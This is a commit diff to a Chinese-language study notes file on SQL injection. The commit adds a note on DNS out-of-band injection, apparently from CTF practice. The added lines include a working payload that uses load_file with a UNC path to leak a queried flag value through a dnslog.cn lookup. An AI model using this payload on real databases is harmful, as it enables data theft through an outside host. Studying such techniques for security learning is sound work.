3e8182e23263d26590921ea04b02da4578f3ebd2
whb54012 <1226844928@qq.com>
2026-06-21 10:25:27 +0000

    自动提交：更新 ${2026/6/21 18:25ilenPM25e}

--- 漏洞类型/sql注入/load_file和带外注入.sql
+++ 漏洞类型/sql注入/load_file和带外注入.sql
@@ -6,3 +6,8 @@ hex(load_file('绝对路径');)
 手动将内容转换成十六进制编码,以防出现不可控问题
 select * from user where id='参数';
 所有为参数的位置都可写十六进制由sql自动转义写入(参数位就是用字符串或数值类型写入的位置)
+
+带外注入
+dns带外注入:
+select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog.cn\\a'));
+需要权限和端口都开启
